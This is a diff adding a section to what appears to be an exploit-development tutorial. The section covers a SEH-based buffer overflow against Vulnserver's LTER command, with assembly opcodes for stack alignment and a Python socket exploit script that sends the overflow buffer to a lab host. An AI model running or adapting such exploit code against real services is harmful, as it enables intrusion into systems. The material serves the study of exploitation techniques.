@@ -317,6 +317,71 @@ We:
 
 ![](/assets/images/CTP/LTERdbuff.JPG)
 
+EIP is pointed at the top of our `D` buffer, we're good to go. This `D` buffer isn't large enough for much code. We also don't have enough room to encode an egghunter. We don't even have enough room to set up an encoded long jump back (I tried, boy did I try.) Let's use our aforementioned negative jump back that we went over in the Alphanumeric section of the post.
+
+### First Negative Jump Back
+First thing we need to do is `push esp` and `pop eax` so that we can set up `ESP` to near the bottom of our `D` buffer so that our decoded code will appear right above it visually and we'll be able to pass execution to our jump back. 
+
+Using `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` (thanks @AnubisOnSec!), we can get those opcodes easily. 
+```terminal_session
+astrid:~/ # /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm > push esp
+00000000  54                push esp
+nasm > pop eax
+00000000  58                pop eax
+```
+
+So our first code in our `D` buffer will be: `\x54\x58`
+
+Next, we have to figure out the difference between `EAX` and where we want it. `EAX` is currently pointed at `0174ECA4` since we put the `ESP` value in there. We want it near the bottom of our `D` buffer so that it's near once our decoded shellcode appears on top of it. I picked the address `0174FFEF` and then calculated the difference. (`0174FFEF` - `0174ECA4` = `134B`). So we need to move up `134B` spaces. Let's get the opcodes in the nasm shell. 
+```terminal_session
+nasm > add ax, 0x134b
+00000000  66054B13          add ax,0x134b
+```
+
+Ok so `EAX` will now hold the value `174FFEF`, now to just push that value back into `ESP`. 
+```terminal_session
+nasm > push eax
+00000000  50                push eax
+nasm > pop esp
+00000000  5C                pop esp
+```
+
+So the rest of our code to prepare `ESP` is: `\x66\x05\x4b\x13\x50\x5C`.
+Let's add the variable `espAdj` to our exploit which now looks like this: 
+```python
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+
+host = "192.168.1.201"
+port = 9999
+
+nSeh = '\x74\x06\x75\x04'
+Seh = '\x2b\x17\x50\x62'
+espAdj = '\x54\x58\x66\x05\x4b\x13\x50\x5C'
+
+buffer = 'A' * 3514
+buffer += nSeh
+buffer += Seh
+buffer += espAdj
+buffer += 'D' * (4000 - 3514 - len(nSeh) - len(Seh) - len(espAdj))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+s.send("LTER /.../" + buffer)
+print s.recv(1024)
+s.close()
+```
+
+And let's run it and see how well we did. If all went well, when we step through this code in the `D` buffer, `ESP` should be pointing at our desired address for it `0174FFEF`. 
+
+![](/assets/images/CTP/LTERespalign.JPG)
+
+
 
 
 
